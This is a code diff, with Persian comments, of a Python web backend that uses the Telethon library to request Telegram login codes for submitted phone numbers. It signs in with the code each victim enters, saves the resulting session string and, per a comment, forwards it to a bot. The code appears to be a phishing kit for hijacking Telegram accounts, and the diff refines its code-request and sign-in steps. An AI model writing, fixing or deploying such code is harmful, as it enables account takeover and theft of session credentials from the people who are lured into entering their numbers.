@@ -24,7 +24,7 @@ sessions = {}
 logging.basicConfig(level=logging.INFO)
 
 # ============================================================
-#  حلقه رویداد ثابت (مهم!)
+#  حلقه رویداد ثابت
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -47,6 +47,7 @@ def request_code():
     sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
     
     try:
+        # ارسال کد با روش جدید
         loop.run_until_complete(send_code(session_id, phone))
     except Exception as e:
         logging.error(f"Error in request_code: {e}")
@@ -83,18 +84,20 @@ def verify_code():
 # ============================================================
 async def send_code(session_id, phone):
     try:
+        # ✅ ساخت کلاینت با session مخصوص
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        if not await client.is_user_authorized():
-            await client.send_code_request(phone)
-            sessions[session_id]['client'] = client
-            sessions[session_id]['status'] = 'code_sent'
-            logging.info(f"✅ Code sent to: {phone}")
-        else:
-            sessions[session_id]['client'] = client
-            sessions[session_id]['status'] = 'already_authorized'
-            
+        # ✅ ارسال درخواست کد
+        await client.send_code_request(phone)
+        
+        # ذخیره کلاینت برای مرحله بعد
+        sessions[session_id]['client'] = client
+        sessions[session_id]['status'] = 'code_sent'
+        sessions[session_id]['phone'] = phone  # ذخیره شماره برای مرحله بعد
+        
+        logging.info(f"✅ Code sent to: {phone}")
+        
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Error sending code: {e}")
@@ -111,8 +114,10 @@ async def verify_session(session_id, phone, code):
         return False
     
     try:
-        # ✅ درست: فقط کد رو تایید کن (شماره قبلاً ثبت شده)
-        await client.sign_in(code=code)
+        # ✅ روش درست: تایید کد با شماره
+        await client.sign_in(phone, code)
+        
+        # دریافت سشن
         session_string = client.session.save()
         
         # ارسال به ربات
@@ -126,8 +131,9 @@ async def verify_session(session_id, phone, code):
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Verification error: {e}")
-        # اگر خطا مربوط به کد اشتباه بود
-        if 'code' in str(e).lower() or 'invalid' in str(e).lower():
+        
+        # اگر کد اشتباه بود
+        if 'code' in str(e).lower() or 'invalid' in str(e).lower() or 'phone' in str(e).lower():
             return False
         raise
 
